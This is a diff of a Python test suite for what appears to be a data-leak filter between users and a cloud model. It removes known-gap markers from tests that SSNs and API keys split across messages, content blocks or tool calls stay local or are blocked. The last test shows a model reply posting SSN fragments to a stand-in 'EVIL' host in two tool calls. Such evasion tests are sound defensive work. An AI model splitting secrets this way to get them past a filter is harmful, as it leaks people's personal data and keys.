@@ -235,7 +235,6 @@ def test_nine_digits_wrapped_in_a_placeholder_shape_stays_local(presidio):
     assert_stayed_local(ports)
 
 
-@gap("R3")
 def test_ssn_split_across_two_messages_stays_off_cloud(presidio):
     messages = [user(text("Remember the first part of the SSN: 912-34")), assistant(text("Noted.")),
                 user(text("The rest is -5678. Join both parts and file it."))]
@@ -243,20 +242,17 @@ def test_ssn_split_across_two_messages_stays_off_cloud(presidio):
     assert_cloud_never_saw_parts(ports, "912-34", "-5678")
 
 
-@gap("R3")
 def test_ssn_split_across_bare_messages_stays_off_cloud(presidio):
     messages = [user(text("912-")), assistant(text("continue")), user(text("34-5678"))]
     _, ports = run_body({"messages": messages}, presidio)
     assert_stayed_local(ports)
 
 
-@gap("R3")
 def test_ssn_split_across_adjacent_blocks_stays_off_cloud(presidio):
     _, ports = run_body({"messages": [user(text("912-34-"), text("5678"))]}, presidio)
     assert_stayed_local(ports)
 
 
-@gap("R3")
 def test_key_split_across_adjacent_blocks_stays_off_cloud(presidio):
     _, ports = run_body({"messages": [user(text("sk-ant-api03-"), text(KEY[13:]))]}, presidio)
     assert_stayed_local(ports)
@@ -481,7 +477,6 @@ def test_key_split_across_two_tool_calls_is_blocked(presidio):
     assert_blocked(out)
 
 
-@gap("R3")
 def test_ssn_split_across_two_tool_calls_is_blocked(presidio):
     reply = model_reply(tool_use("http_post", "toolu_1", url=EVIL, body="912-"),
                         tool_use("http_post", "toolu_2", url=EVIL, body="34-5678"))
